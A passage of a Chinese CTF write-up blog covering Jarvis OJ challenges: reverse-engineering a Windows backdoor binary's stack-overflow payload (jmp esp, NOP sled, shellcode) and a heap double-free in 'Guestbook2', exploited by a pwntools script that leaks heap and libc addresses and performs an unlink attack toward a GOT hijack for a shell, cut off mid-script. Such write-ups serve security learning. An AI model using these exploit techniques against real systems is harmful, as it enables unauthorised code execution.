class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    t[i].join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n\nfind flag:"</span> + <span class="string">''</span>.join(flag)</span><br></pre></td></tr></table></figure>
<p>flag : <code>PCTF{49d4310a1085875567932651e559e153cfc8bd27b431}</code></p>
<hr>
<h2 id="PWN-Backdoor"><a href="#PWN-Backdoor" class="headerlink" title="PWN - Backdoor"></a>PWN - Backdoor</h2><p>题目描述：</p>
<blockquote>
<p>这是一个有后门的程序，有个参数可以触发该程序执行后门操作，请找到这个参数，并提交其SHA256摘要。(小写)</p>
</blockquote>
<blockquote>
<p>FLAG：PCTF{参数的sha256}</p>
</blockquote>
<blockquote>
<p><a href="https://dn.jarvisoj.com/challengefiles/vulnerable.rar.10d720f2dcf2b4133ec512813d7b89ce" target="_blank" rel="noopener">vulnerable.rar.10d720f2dcf2b4133ec512813d7b89ce</a></p>
</blockquote>
<p>首先这道题是windows的，而且他该死的用了<code>msvcr100d.dll</code>，就是vs编译时开debug编译出来时用的dll。</p>
<p>我本地没有这个dll，就网上找一个，放到当前目录就好：<a href="http://www.duote.com/dll/msvcr100d_dll.html" target="_blank" rel="noopener">http://www.duote.com/dll/msvcr100d_dll.html</a></p>
<hr>
<p><strong>func1:</strong></p>
<p>代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax@2</span><br><span class="line">  char v4; // [sp+50h] [bp-2C8h]@6</span><br><span class="line">  char v5; // [sp+E1h] [bp-237h]@6</span><br><span class="line">  char v6; // [sp+E4h] [bp-234h]@6</span><br><span class="line">  char Source[4]; // [sp+100h] [bp-218h]@6</span><br><span class="line">  __int16 i; // [sp+108h] [bp-210h]@3</span><br><span class="line">  char Dest[512]; // [sp+10Ch] [bp-20Ch]@3</span><br><span class="line">  __int16 offset; // [sp+30Ch] [bp-Ch]@1</span><br><span class="line">  LPSTR lpMultiByteStr; // [sp+310h] [bp-8h]@1</span><br><span class="line">  int cbMultiByte; // [sp+314h] [bp-4h]@1</span><br><span class="line"></span><br><span class="line">  cbMultiByte = WideCharToMultiByte(1u, 0, (LPCWSTR)argv[1], -1, 0, 0, 0, 0);</span><br><span class="line">  lpMultiByteStr = (LPSTR)unknown_libname_1(cbMultiByte);</span><br><span class="line">  WideCharToMultiByte(1u, 0, (LPCWSTR)argv[1], -1, lpMultiByteStr, cbMultiByte, 0, 0);</span><br><span class="line">  offset = *(_WORD *)lpMultiByteStr;            // 上面一坨不用管，总之就是unicode和char的转换</span><br><span class="line">  if ( offset &gt;= 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    offset ^= 0x6443u;                          // padding</span><br><span class="line">    strcpy(Dest, &quot;0&quot;);</span><br><span class="line">    memset(&amp;Dest[2], 0, 510u);</span><br><span class="line">    for ( i = 0; i &lt; offset; ++i )</span><br><span class="line">      Dest[i] = &apos;A&apos;;</span><br><span class="line">    strcpy(Source, &quot;\x12E&quot;);                  // 7FFA4512h-&gt;jmp esp</span><br><span class="line">    strcpy(&amp;Dest[offset], Source);</span><br><span class="line">    qmemcpy(&amp;v6, &amp;code_nop, 26u);               // nopnopnop</span><br><span class="line">    strcpy(&amp;Dest[offset + 4], &amp;v6);</span><br><span class="line">    qmemcpy(&amp;v4, &amp;code, 0x91u);</span><br><span class="line">    v5 = 0;</span><br><span class="line">    strcpy(&amp;Dest[offset + 29], &amp;v4);</span><br><span class="line">    sub_401000(Dest);</span><br><span class="line">    result = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    result = -1;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>栈分布：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">-00000218 Source          db 4 dup(?)</span><br><span class="line">-00000214 var_214         db ?</span><br><span class="line">-00000213                 db ? ; undefined</span><br><span class="line">-00000212                 db ? ; undefined</span><br><span class="line">-00000211                 db ? ; undefined</span><br><span class="line">-00000210 var_210         dw ?</span><br><span class="line">-0000020E                 db ? ; undefined</span><br><span class="line">-0000020D                 db ? ; undefined</span><br><span class="line">-0000020C Dest            db 512 dup(?)</span><br><span class="line">-0000000C offset          dw ?</span><br><span class="line">-0000000A                 db ? ; undefined</span><br><span class="line">-00000009                 db ? ; undefined</span><br><span class="line">-00000008 lpMultiByteStr  dd ?                    ; offset</span><br><span class="line">-00000004 cbMultiByte     dd ?</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008 argc            dd ?</span><br><span class="line">+0000000C argv            dd ?                    ; offset</span><br><span class="line">+00000010 envp            dd ?                    ; offset</span><br><span class="line">+00000014</span><br><span class="line">+00000014 ; end of stack variables</span><br></pre></td></tr></table></figure>
<p>首先看到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strcpy(Source, &quot;\x12E&quot;);                  // 7FFA4512h-&gt;jmp esp</span><br></pre></td></tr></table></figure></p>
<p>这个”\x12E”是IDA分析失误，在反汇编窗口跟过去应该是一个int值，对应地址7FFA4512h，是windows上一个万能的<code>jmp esp</code>（几乎所有平台这个地址上都是jmp esp）。上面是padding，用“A”填充很好理解，下面跟着一段nop和shellcode。</p>
<p>而那个offset就是padding的长度，我们的输入就是<code>offest ^ 0x6443</code>，一开始我以为是在main里栈溢出，一直不成功，突然发现在栈布局里，offset就在dest的后面。如果dest溢出去覆盖ret，那offset会被改成”AAAA”,直接GG。</p>
<p>所以应该是在<code>sub_401000(Dest);</code>里栈溢出。</p>
<hr>
<p><strong>sub_401000()：</strong></p>
<p>代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl sub_401000(char *Source)</span><br><span class="line">&#123;</span><br><span class="line">  char Dest[2]; // [sp+4Ch] [bp-20h]@1</span><br><span class="line">  int v3; // [sp+4Eh] [bp-1Eh]@1</span><br><span class="line">  int v4; // [sp+52h] [bp-1Ah]@1</span><br><span class="line">  int v5; // [sp+56h] [bp-16h]@1</span><br><span class="line">  int v6; // [sp+5Ah] [bp-12h]@1</span><br><span class="line">  int v7; // [sp+5Eh] [bp-Eh]@1</span><br><span class="line">  int v8; // [sp+62h] [bp-Ah]@1</span><br><span class="line">  int v9; // [sp+66h] [bp-6h]@1</span><br><span class="line">  __int16 v10; // [sp+6Ah] [bp-2h]@1</span><br><span class="line"></span><br><span class="line">  strcpy(Dest, &quot;0&quot;);</span><br><span class="line">  v3 = 0;</span><br><span class="line">  v4 = 0;</span><br><span class="line">  v5 = 0;</span><br><span class="line">  v6 = 0;</span><br><span class="line">  v7 = 0;</span><br><span class="line">  v8 = 0;</span><br><span class="line">  v9 = 0;</span><br><span class="line">  v10 = 0;</span><br><span class="line">  strcpy(Dest, Source);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>栈布局：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">-00000020 Dest            db 2 dup(?)</span><br><span class="line">-0000001E var_1E          dd ?</span><br><span class="line">-0000001A var_1A          dd ?</span><br><span class="line">-00000016 var_16          dd ?</span><br><span class="line">-00000012 var_12          dd ?</span><br><span class="line">-0000000E var_E           dd ?</span><br><span class="line">-0000000A var_A           dd ?</span><br><span class="line">-00000006 var_6           dd ?</span><br><span class="line">-00000002 var_2           dw ?</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008 Source          dd ?                    ; offset</span><br><span class="line">+0000000C</span><br><span class="line">+0000000C ; end of stack variables</span><br></pre></td></tr></table></figure>
<p>所以offset为0x20+4 = 0x24 。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x20</span> + <span class="number">4</span></span><br><span class="line"></span><br><span class="line">a = hex(offset ^ <span class="number">0x6443</span>)[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">a = a.decode(<span class="string">'hex'</span>)[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"PCTF&#123;"</span> + hashlib.sha256(a).hexdigest() + <span class="string">"&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#PCTF&#123;2b88144311832d59ef138600c90be12a821c7cf01a9dc56a925893325c0af99f&#125;</span></span><br></pre></td></tr></table></figure>
<p>flag : <code>PCTF{2b88144311832d59ef138600c90be12a821c7cf01a9dc56a925893325c0af99f}</code></p>
<hr>
<h2 id="PWN-Guestbook2"><a href="#PWN-Guestbook2" class="headerlink" title="PWN - Guestbook2"></a>PWN - Guestbook2</h2><p>题目描述：</p>
<blockquote>
<p>听说guestbook1很快被人日穿了，出题人表示不服，于是对Guestbook进行了升级，自以为写的很科学~~大家一起鉴定一下。</p>
<p>nc pwn.jarvisoj.com 9879</p>
<p><a href="https://dn.jarvisoj.com/challengefiles/guestbook2.rar.f90369a6de48cbfe84ea32b232ad9630" target="_blank" rel="noopener">guestbook2.rar.f90369a6de48cbfe84ea32b232ad9630</a></p>
</blockquote>
<p>第一次接触真实的heap的题目，写的详细点。</p>
<p>题目是一个简单的留言版的功能。</p>
<p>在bss段只有一个指针，指向程序运行初建立的一个大chunk</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.bss:00000000006020A8 ; list_struc *chunk_list</span><br><span class="line">.bss:00000000006020A8 chunk_list      dq ?                    ; DATA XREF: malloc_init+12w</span><br><span class="line">.bss:00000000006020A8                                         ; malloc_init+19r ...</span><br><span class="line">.bss:00000000006020A8 _bss            ends</span><br><span class="line">.bss:00000000006020A8</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">malloc_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [sp+Ch] [bp-4h]@1</span></span><br><span class="line"></span><br><span class="line">  chunk_list = (list_struc *)<span class="built_in">malloc</span>(<span class="number">0x1810</span>uLL);</span><br><span class="line">  chunk_list-&gt;sum = <span class="number">256L</span>L;</span><br><span class="line">  chunk_list-&gt;number = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    chunk_list-&gt;block[i].in_use = <span class="number">0L</span>L;</span><br><span class="line">    chunk_list-&gt;block[i].len = <span class="number">0L</span>L;</span><br><span class="line">    chunk_list-&gt;block[i].ptr = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>两个结构体</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">00000000 list_struc      struc ; (sizeof=0x1810, mappedto_1)</span><br><span class="line">00000000 sum             dq ?</span><br><span class="line">00000008 number          dq ?</span><br><span class="line">00000010 block           block 256 dup(?)</span><br><span class="line">00001810 list_struc      ends</span><br><span class="line">00001810</span><br><span class="line">00000000 ; ---------------------------------------------------------------------------</span><br><span class="line">00000000</span><br><span class="line">00000000 block           struc ; (sizeof=0x18, mappedto_2) ; XREF: list_struc/r</span><br><span class="line">00000000 in_use          dq ?</span><br><span class="line">00000008 len             dq ?</span><br><span class="line">00000010 ptr             dq ?                    ; offset</span><br><span class="line">00000018 block           ends</span><br><span class="line">00000018</span><br></pre></td></tr></table></figure>
<p><strong>漏洞的产生：</strong></p>
<p>在del函数中，没有检查之前设置的inuse位，而且free完指针没有清空。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">void __cdecl del_post()</span><br><span class="line">&#123;</span><br><span class="line">  int i; // [sp+Ch] [bp-4h]@2</span><br><span class="line"></span><br><span class="line">  if ( chunk_list-&gt;number &lt;= 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No posts yet.&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Post number: &quot;);</span><br><span class="line">    i = get_num();</span><br><span class="line">    if ( i &gt;= 0 &amp;&amp; i &lt; chunk_list-&gt;sum )        // 【未检查inuse位，double_free】</span><br><span class="line">    &#123;</span><br><span class="line">      --chunk_list-&gt;number;</span><br><span class="line">      chunk_list-&gt;block[i].in_use = 0LL;</span><br><span class="line">      chunk_list-&gt;block[i].len = 0LL;</span><br><span class="line">      free(chunk_list-&gt;block[i].ptr);           // 【指针未清空】</span><br><span class="line">      puts(&quot;Done.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;Invalid number!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>一些麻烦点：</strong></p>
<p>在edit函数中，检查了inuse位，就不能直接编辑free过的chunk。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">void __cdecl edit_post()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int aligned_len; // eax@10</span><br><span class="line">  list_struc *v1; // rbx@10</span><br><span class="line">  int len; // [sp+4h] [bp-1Ch]@5</span><br><span class="line">  int i; // [sp+8h] [bp-18h]@1</span><br><span class="line"></span><br><span class="line">  printf(&quot;Post number: &quot;);</span><br><span class="line">  i = get_num();</span><br><span class="line">  if ( i &gt;= 0 &amp;&amp; i &lt; chunk_list-&gt;sum &amp;&amp; chunk_list-&gt;block[i].in_use == 1 )// 【检查了inuse位】</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Length of post: &quot;);</span><br><span class="line">    len = get_num();</span><br><span class="line">    if ( len &gt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( len &gt; 4096 )</span><br><span class="line">        len = 4096;</span><br><span class="line">      if ( len != chunk_list-&gt;block[i].len )</span><br><span class="line">      &#123;</span><br><span class="line">        aligned_len = (unsigned int)((signed int)(128</span><br><span class="line">                                                - (((((unsigned int)((unsigned __int64)len &gt;&gt; 32) &gt;&gt; 25) + (_BYTE)len) &amp; 0x7F)</span><br><span class="line">                                                 - ((unsigned int)((unsigned __int64)len &gt;&gt; 32) &gt;&gt; 25))) &gt;&gt; 31) &gt;&gt; 25;</span><br><span class="line">        v1 = chunk_list;</span><br><span class="line">        v1-&gt;block[i].ptr = realloc(</span><br><span class="line">                             chunk_list-&gt;block[i].ptr,</span><br><span class="line">                             (signed int)((((_BYTE)aligned_len + -128 - (char)len % -128) &amp; 0x7F) - aligned_len + len));</span><br><span class="line">        chunk_list-&gt;block[i].len = len;</span><br><span class="line">      &#125;</span><br><span class="line">      printf(&quot;Enter your post: &quot;);</span><br><span class="line">      read_n_bytes((__int64)chunk_list-&gt;block[i].ptr, len);</span><br><span class="line">      puts(&quot;Done.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;Invalid length!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Invalid number!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其次，在add函数和edit函数中，真实malloc的size都是对用户输入的len0x80字节对齐后的。就是说我们只能malloc 0x80,0x100,0x180,0x200等的size。</p>
<p>但依然有方法绕过。</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    cn = process(<span class="string">'./guestbook2'</span>)</span><br><span class="line">    bin = ELF(<span class="string">'./guestbook2'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    cn = remote(<span class="string">'pwn.jarvisoj.com'</span>, <span class="number">9879</span>)</span><br><span class="line">    bin = ELF(<span class="string">'./guestbook2'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_post</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_post</span><span class="params">(length,content)</span>:</span></span><br><span class="line">    cn.sendline(<span class="string">'2'</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">'Length'</span>)</span><br><span class="line">    cn.sendline(str(length))</span><br><span class="line">    cn.recvuntil(<span class="string">'Enter'</span>)</span><br><span class="line">    cn.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_post</span><span class="params">(idx,length,content)</span>:</span></span><br><span class="line">    cn.sendline(<span class="string">'3'</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">'number'</span>)</span><br><span class="line">    cn.sendline(str(idx))</span><br><span class="line">    cn.recvuntil(<span class="string">'Length'</span>)</span><br><span class="line">    cn.sendline(str(length))</span><br><span class="line">    cn.recvuntil(<span class="string">'Enter'</span>)</span><br><span class="line">    cn.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_post</span><span class="params">(idx)</span>:</span></span><br><span class="line">    cn.sendline(<span class="string">'4'</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">'number'</span>)</span><br><span class="line">    cn.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">chunk_list=<span class="number">0x00000000006020A8</span></span><br><span class="line">test=<span class="number">0x00000000004012E6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#-------init-------</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    add_post(<span class="number">0x80</span>,str(i)*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">del_post(<span class="number">3</span>)</span><br><span class="line">del_post(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">'0'</span>*<span class="number">0x80</span> + <span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">edit_post(<span class="number">0</span>,<span class="number">0x90</span>,pay)</span><br><span class="line"><span class="comment">#------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------leak----------</span></span><br><span class="line">cn.sendline(<span class="string">'1'</span>)</span><br><span class="line">cn.recvuntil(<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line">leak_data = cn.recvuntil(<span class="string">'\x0a'</span>)[:<span class="number">-1</span>]</span><br><span class="line">cn.recv()</span><br><span class="line">leak_addr = u64(leak_data + <span class="string">'\x00'</span>*(<span class="number">8</span>-len(leak_data)))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x19d0</span><span class="comment">#offset</span></span><br><span class="line">chunk0_addr = heap_base+<span class="number">0x30</span></span><br><span class="line">success(<span class="string">"leak_addr: "</span>+hex(leak_addr))</span><br><span class="line">success(<span class="string">"heap_base: "</span>+hex(heap_base))</span><br><span class="line">success(<span class="string">"chunk0_addr: "</span>+hex(chunk0_addr))</span><br><span class="line"><span class="comment">#----------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#-------unlink--------</span></span><br><span class="line">pay = p64(<span class="number">0x90</span>) + p64(<span class="number">0x80</span>) + p64(chunk0_addr<span class="number">-0x18</span>) + p64(chunk0_addr<span class="number">-0x10</span>) + <span class="string">'0'</span>*(<span class="number">0x80</span><span class="number">-8</span>*<span class="number">4</span>)</span><br><span class="line">pay += p64(<span class="number">0x80</span>) + p64(<span class="number">0x90</span>+<span class="number">0x90</span>) + <span class="string">'1'</span>*<span class="number">0x70</span></span><br><span class="line">success(hex(len(pay)))</span><br><span class="line">edit_post(<span class="number">0</span>,len(pay),pay)</span><br><span class="line">del_post(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#----------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------leak----------</span></span><br><span class="line">pay = p64(<span class="number">2</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0x100</span>) + p64(chunk0_addr<span class="number">-0x18</span>)</span><br><span class="line">pay += p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(bin.got[<span class="string">'atoi'</span>])</span><br><span class="line">pay += <span class="string">'\x00'</span>*(<span class="number">0x100</span>-len(pay))</span><br><span class="line">edit_post(<span class="number">0</span>,len(pay),pay)</span><br><span class="line">cn.sendline(<span class="string">'1'</span>)</span><br><span class="line">cn.recvuntil(<span class="string">'0. '</span>)</span><br><span class="line">cn.recvuntil(<span class="string">'1. '</span>)</span><br><span class="line">atoi = cn.recvuntil(<span class="string">'\x0a'</span>)[:<span class="number">-1</span>]</span><br><span class="line">cn.recv()</span><br><span class="line">atoi = u64(atoi + <span class="string">'\x00'</span>*(<span class="number">8</span>-len(atoi)))</span><br><span class="line">system = atoi - libc.symbols[<span class="string">'atoi'</span>]+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">success(<span class="string">"atoi: "</span>+hex(atoi))</span><br><span class="line">success(<span class="string">"system: "</span>+hex(system))</span><br><span class="line"><span class="comment">#----------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------hijack&amp;getshell--------</span></span><br><span class="line">edit_post(<span class="number">1</span>,<span 